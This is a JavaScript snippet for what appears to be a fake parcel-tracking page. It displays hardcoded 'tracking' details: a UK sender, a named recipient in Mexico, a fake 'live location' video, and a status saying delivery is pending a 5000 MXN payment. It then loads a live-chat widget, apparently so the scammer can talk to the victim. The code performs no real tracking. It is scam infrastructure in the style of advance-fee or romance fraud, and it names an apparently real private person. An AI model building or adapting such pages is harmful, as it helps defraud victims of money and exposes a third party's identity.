function handle54389499LXVN(resultElement) {
    let result = {
        sender: 'James Elijah  ',
        country: 'United Kingdom ',
        receiver: 'Itsel Guadalupe Ovalle Toledo',
        date: 'Sept 4, 2025',
        location: 'Out for Delivery - Out for Delivery - Area. Within 24 hours package would get to destined country - pending payment of 5000MXN'
    };

    // Display the result
    resultElement.innerHTML = `
        <p>SENDER NAME: ${result.sender}</p>
        <p>SENDER ADDRESS:  ${result.country}</p>
        <p>RECIEVERS NAME : ${result.receiver}</p>
        <p>DATE: ${result.date}</p>
        <p><video id="local" 
        src="live.mp4" autoplay muted loop></video>           Live Location:transit ${result.location}</p>`;

    // Inject the LiveChat script
    const livechatScript = document.createElement('script');
    livechatScript.src = "//code.tidio.co/jp7tntk5wztekymwyini3zgxr8abyc5w.js";
    livechatScript.async = true;
    document.body.appendChild(livechatScript);
}
